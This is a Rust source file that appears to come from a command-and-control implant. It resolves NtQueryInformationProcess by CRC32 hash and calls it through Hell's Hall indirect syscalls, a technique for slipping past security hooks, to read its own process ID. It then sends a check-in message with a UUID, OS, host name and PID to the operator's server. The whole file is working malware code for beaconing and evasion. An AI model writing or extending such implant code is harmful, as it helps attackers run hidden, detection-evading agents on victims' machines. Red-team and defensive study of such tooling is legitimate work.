use crate::config;
use crate::transport;
use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall,crc32h};

use ntapi::ntpsapi::{PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::shared::ntdef::NTSTATUS;
use std::{mem::{size_of, zeroed}, ptr};

fn get_pid_via_syscall() -> u32 {
    unsafe {
        let hash = crc32h("NtQueryInformationProcess");

        let mut nt_query = NtSyscall {
            dw_ssn: 0,
            dw_syscall_hash: 0,
            p_syscall_address: ptr::null_mut(),
            p_syscall_inst_address: ptr::null_mut(),
        };

        if !fetch_nt_syscall(hash, &mut nt_query) {
            return 0;
        }

        SetSSn(nt_query.dw_ssn as u16, nt_query.p_syscall_inst_address);

        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let mut ret_len: u32 = 0;

        let status: NTSTATUS = RunSyscall(
            GetCurrentProcess() as _,
            ProcessBasicInformation as _,
            &mut pbi as *mut _ as _,
            size_of::<PROCESS_BASIC_INFORMATION>() as _,
            &mut ret_len as *mut _ as _,
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            ptr::null_mut(), ptr::null_mut(), ptr::null_mut()
        );

        if status == 0 {
            pbi.UniqueProcessId as u32
        } else {
            0
        }
    }
}

pub fn checkin() {
    let checkin_data = serde_json::json!({
        "action": "checkin",
        "uuid": *config::UUID,
        "os": "windows",
        "user": "user",
        "host": "COMMANDO",
        "pid": get_pid_via_syscall(),
        "architecture": "x64"
    });

    let json_str = serde_json::to_string(&checkin_data).unwrap();
    transport::send_request(&json_str);
}
